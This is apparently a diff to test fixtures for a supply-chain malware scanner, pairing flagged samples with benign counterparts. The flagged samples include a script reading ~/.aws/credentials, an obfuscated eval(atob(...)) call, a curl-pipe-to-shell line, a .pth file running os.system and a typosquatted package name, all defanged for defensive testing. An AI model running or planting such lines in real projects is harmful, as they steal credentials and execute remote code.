@@ -86,6 +86,18 @@ MALICIOUS: dict[str, tuple[Files, str]] = {
         {"tool.py": f'"""\ntitle: x\nrequirements: reqeusts\n"""\n# {MARK}\n'.encode()},
         "LB-D03-namensverwechslung",
     ),
+    "COD-01": (
+        {
+            "tools/sync.py": _t(
+                "import os\nk = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+            )
+        },
+        "LB-C04-zugangsdaten-lesen",
+    ),
+    "COD-03": (
+        {"dist/index.js": _t("eval(atob('Y29uc29sZS5sb2coMSk='));\n", "//")},
+        "LB-C08-verschleiert",
+    ),
     "COD-04": ({"run.sh": _t("curl -s https://x.invalid/x | sh\n")}, "LB-A03-installationsskript"),
     "COD-05": ({"evil.pth": b"import os; os.system('echo hi')\n"}, "LB-A02-python-pth"),
     "COD-06": (
@@ -190,6 +202,8 @@ BENIGN: dict[str, Files] = {
     "AGT-06": {
         ".mcp.json": _json({"mcpServers": {"x": {"command": "node", "args": ["dist/i.js"]}}})
     },
+    "COD-01": {"tools/sync.py": _t("import json\nprint(json.dumps({'ok': True}))\n")},
+    "COD-03": {"dist/index.js": _t("console.log(JSON.parse('{\"ok\": true}'));\n", "//")},
     "COD-04": {"build.sh": _t("set -eu\nnpm run build\n")},
     "COD-05": {"pfade.pth": b"src\n"},
     "COD-06": {"setup.py": _t("from setuptools import setup\nsetup(name='x')\n")},
